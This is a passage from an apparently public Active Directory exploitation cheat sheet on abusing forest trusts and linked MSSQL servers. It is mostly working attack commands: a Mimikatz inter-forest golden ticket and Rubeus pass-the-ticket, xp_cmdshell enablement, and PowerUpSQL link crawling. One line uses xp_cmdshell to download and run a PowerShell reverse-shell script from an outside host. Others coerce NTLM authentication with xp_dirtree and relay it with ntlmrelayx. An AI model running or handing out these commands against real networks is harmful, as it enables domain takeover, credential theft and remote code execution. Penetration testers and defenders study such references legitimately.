Since a forest is a security boundary, we can only access domain services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for users that have an account (with the same username) in both forests and try password re-use. Additionally, we can use BloodHound or PowerView to hunt for foreign group memberships between forests. The PowerView command:

```powershell
Get-DomainForeignGroupMember -domain targetdomain.com
```

In some cases, it is possible that SID filtering (the protection causing the above), is _disabled_ between forests. If you run `Get-DomainTrust` and you see the `TREAT_AS_EXTERNAL` property, this is the case! In this case, you can abuse the forest trust like a domain trust, as described above. Note that you still can _NOT_ forge a ticket for any SID between 500 and 1000 though, so you can’t become DA (not even indirectly through group inheritance). In this case, look for groups that grant e.g. local admin on the domain controller or similar non-domain privileges. For more information, refer to [this blog post](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/).

To impersonate a user from our source domain to access services in a foreign domain, we can do the following. Extract inter-forest trust key as in [‘Using domain trust key’](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#using-domain-trust-key) above.

Use Mimikatz to generate a TGT for the target domain using the trust key:

```plaintext
Kerberos::golden /user:Administrator /service:krbtgt /domain:currentdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /target:targetdomain.com /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:ticket.kirbi
```

Then, use Rubeus to ask a TGS for e.g. the `CIFS` service on the target DC using this TGT.

```powershell
.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

Now we can use the CIFS service on the target forest’s DC as the DA of our source domain (again, as long as this trust was configured to exist).

### Abusing MSSQL databases for lateral movement

MSSQL databases can be linked, such that if you compromise one you can execute queries (or even OS commands!) on other databases in the context of a specific user (`sa` maybe? 😙). If this is configured, it can even be used to traverse Forest boundaries! If we have SQL execution, we can use the following commands to enumerate database links.

```sql
-- Find linked servers
EXEC sp_linkedservers

-- Run SQL query on linked server
select mylogin from openquery("TARGETSERVER", 'select SYSTEM_USER as mylogin')

-- Enable 'xp_cmdshell' on remote server and execute commands, only works if RPC is enabled
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGETSERVER
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGETSERVER
EXEC ('xp_cmdshell ''whoami'' ') AT TARGETSERVER
```

SQL

We can also use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).

```powershell
# Get MSSQL databases in the domain, and test connectivity
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft

# Try to get information on all domain databases
Get-SQLInstanceDomain | Get-SQLServerInfo

# Get information on a single reachable database
Get-SQLServerInfo -Instance TARGETSERVER

# Scan for MSSQL misconfigurations to escalate to SA
Invoke-SQLAudit -Verbose -Instance TARGETSERVER

# Execute SQL query
Get-SQLQuery -Query "SELECT system_user" -Instance TARGETSERVER

# Run command (enables XP_CMDSHELL automatically if required)
Invoke-SQLOSCmd -Instance TARGETSERVER -Command "whoami" |  select -ExpandProperty CommandResults

# Automatically find all linked databases
Get-SqlServerLinkCrawl -Instance TARGETSERVER | select instance,links | ft

# Run command if XP_CMDSHELL is enabled on any of the linked databases
Get-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "whoami"' | select instance,links,customquery | ft

Get-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"' | select instance,links,customquery | ft
```

PowerShell

If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the `xp_dirtree` stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.

```sql
EXEC master..xp_dirtree "\\192.168.49.67\share"
```

Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run `calc.exe`. Omit the `-c` parameter to attempt a `secretsdump` instead.

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe'
```